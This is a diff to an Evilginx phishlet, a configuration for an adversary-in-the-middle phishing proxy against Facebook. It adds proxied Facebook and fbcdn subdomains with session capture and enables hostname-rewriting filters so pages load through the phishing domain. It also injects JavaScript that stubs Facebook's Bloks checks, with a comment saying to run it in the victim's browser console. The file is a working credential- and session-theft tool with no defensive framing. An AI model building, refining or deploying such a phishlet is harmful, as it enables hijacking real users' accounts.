@@ -1,15 +1,18 @@
 author: 'evilginx-enhanced'
 min_ver: '3.0.0'
 proxy_hosts:
-  # - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
-  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true}
+  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true}
   - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: false}
-  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'facebook.com', session: false}
+  - {phish_sub: 'static', orig_sub: 'staticxx', domain: 'fbcdn.net', session: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: false}
+  - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: false}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true}
 
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'WebBloks', replace: '//WebBloks', mimes: ['application/javascript']}
-  # - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'www\.facebook\.com', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'graph.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'graph\.facebook\.com', replace: '{hostname}', mimes: ['*/*']}
   - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'fbcdn.net', search: 'static\.xx\.fbcdn\.net', replace: '{hostname}', mimes: ['*/*']}
 
@@ -67,6 +70,7 @@ js_inject:
         validatePayload: function() { return true; },
         parseTree: function() { return {}; }
       };
+      // Run in victim's browser console
       console.log('Bloks status:', typeof Bloks, Bloks?.validatePayload);
       Object.defineProperty(window, 'fb_web_bloks', {value: false});
 
